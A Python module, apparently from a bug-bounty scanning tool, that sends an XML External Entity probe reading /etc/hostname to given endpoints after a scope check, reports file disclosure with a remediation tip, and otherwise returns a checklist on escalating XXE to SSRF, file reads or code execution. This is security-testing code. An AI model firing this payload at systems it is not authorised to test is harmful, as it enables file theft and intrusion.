"""Chapter 15 — XML External Entities.

Sends a benign XXE probe to any endpoint that accepts XML content. Without
explicit XML endpoints provided, this runner emits a methodology checklist.
"""
from __future__ import annotations

import httpx as _httpx

from ...core.finding import Finding
from ...core.scope import Scope
from ._shared import BBBWorkflow, register


XXE_PROBE = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<root>&xxe;</root>
"""


@register
class BBB_ch15(BBBWorkflow):
    key = "ch15_xxe"
    chapter_number = 15
    title = "XML External Entities"

    async def run(self, target: str, *, scope: Scope, xml_endpoints: list[str] | None = None,
                  **kw) -> list[Finding]:
        if not xml_endpoints:
            return [Finding(
                code="BBB-XXE-CHECKLIST",
                title="XXE methodology checklist",
                severity="info", confidence="low",
                asset=target,
                description="Provide xml_endpoints=[...] to actively probe.",
                bbb_chapter=self.key,
                evidence={
                    "methodology": [
                        "Identify XML inputs (SOAP, SAML, .docx upload, RSS, OAuth federation, etc.)",
                        "Submit a benign probe declaring a SYSTEM entity → look for file content in the response.",
                        "If blind, swap to a parameter entity DTD on an OOB server.",
                        "Escalate to LFI, SSRF, RCE via PHP/Java parsers.",
                    ],
                    "probe": XXE_PROBE.strip(),
                },
            )]
        findings: list[Finding] = []
        async with _httpx.AsyncClient(timeout=20, http2=True,
                                      headers={"User-Agent": scope.user_agent,
                                               "Content-Type": "application/xml"},
                                      verify=False) as c:
            for ep in xml_endpoints:
                scope.check_url(ep, action="bbb.ch15")
                try:
                    r = await c.post(ep, content=XXE_PROBE.encode())
                except Exception:
                    continue
                if r.status_code < 500 and any(tok in r.text for tok in ("root:", "localhost", "$HOSTNAME")):
                    findings.append(Finding(
                        code="BBB-XXE-FILE",
                        title="XML External Entity file disclosure",
                        severity="high", confidence="high",
                        asset=ep,
                        description="XXE entity resolved — server returned local file content.",
                        recommendation="Disable external entity resolution in the XML parser (e.g. libxml2 LIBXML_NONET).",
                        wstg_id="WSTG-INPV-07", cwe="CWE-611", bbb_chapter=self.key,
                        evidence={"snippet": r.text[:1500]},
                    ))
        return findings
